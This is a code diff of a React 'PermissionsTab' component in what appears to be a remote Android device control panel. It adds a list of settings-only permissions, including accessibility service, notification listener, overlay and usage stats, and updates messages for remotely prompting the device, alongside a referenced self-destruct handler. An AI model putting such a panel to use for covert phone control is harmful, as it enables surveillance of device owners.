@@ -70,20 +70,34 @@ export default function PermissionsTab({ device, sendCommand, results }) {
     sendCommand(deviceId, 'get_permissions');
   };
 
+  // Permissions that cannot use the native dialog — require a Settings page instead.
+  const SETTINGS_ONLY = new Set([
+    'android.permission.BIND_ACCESSIBILITY_SERVICE',
+    'android.permission.BIND_NOTIFICATION_LISTENER_SERVICE',
+    'android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS',
+    'android.permission.PACKAGE_USAGE_STATS',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.SYSTEM_ALERT_WINDOW',
+  ]);
+
   const handleRequestPermission = (permission) => {
     setRequesting(permission);
-    setStatus(`Requesting: ${PERMISSION_LABELS[permission] || permission}`);
+    const label = PERMISSION_LABELS[permission] || permission;
+    const isSettingsOnly = SETTINGS_ONLY.has(permission);
+    setStatus(`Requesting: ${label}…`);
     sendCommand(deviceId, 'request_permission', { permission });
     setTimeout(() => {
       setRequesting(null);
-      setStatus('Settings opened on device — user can grant the permission.');
+      setStatus(isSettingsOnly
+        ? `Settings page opened on device for: ${label}`
+        : `Permission dialog shown on device for: ${label}`);
     }, 2000);
   };
 
   const handleRequestAll = () => {
-    setStatus('Opening app settings on device for all permissions…');
+    setStatus('Showing permission dialog for all missing permissions on device…');
     sendCommand(deviceId, 'request_all_permissions');
-    setTimeout(() => setStatus('App settings opened — user can grant all permissions.'), 2000);
+    setTimeout(() => setStatus('Permission dialog sent — user can grant all missing permissions.'), 2000);
   };
 
   const handleSelfDestruct = () => {
@@ -197,7 +211,11 @@ export default function PermissionsTab({ device, sendCommand, results }) {
                     className="perm-request-btn"
                     onClick={() => handleRequestPermission(item.permission)}
                     disabled={!isOnline || requesting === item.permission}
-                    title="Open settings on device for this permission"
+                    title={
+                      SETTINGS_ONLY.has(item.permission)
+                        ? 'Open Settings page on device for this permission'
+                        : 'Show the native permission dialog on device'
+                    }
                   >
                     {requesting === item.permission ? '⏳' : '⚡ Request'}
                   </button>
@@ -212,7 +230,7 @@ export default function PermissionsTab({ device, sendCommand, results }) {
       <div style={{ marginTop: 24, padding: '18px 20px', background: 'rgba(124,58,237,0.07)', border: '1px solid rgba(124,58,237,0.25)', borderRadius: 10 }}>
         <div style={{ fontSize: 14, fontWeight: 600, color: '#a78bfa', marginBottom: 4 }}>🔐 Special Permissions</div>
         <div style={{ fontSize: 11, color: '#64748b', marginBottom: 14 }}>
-          These permissions require manual user action in Android Settings. Clicking "Request" opens the exact settings page on the device.
+          These permissions cannot be granted through the standard dialog — they require the user to manually enable them in Android Settings. Clicking "Request" opens the exact settings page on the device.
         </div>
         <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
 
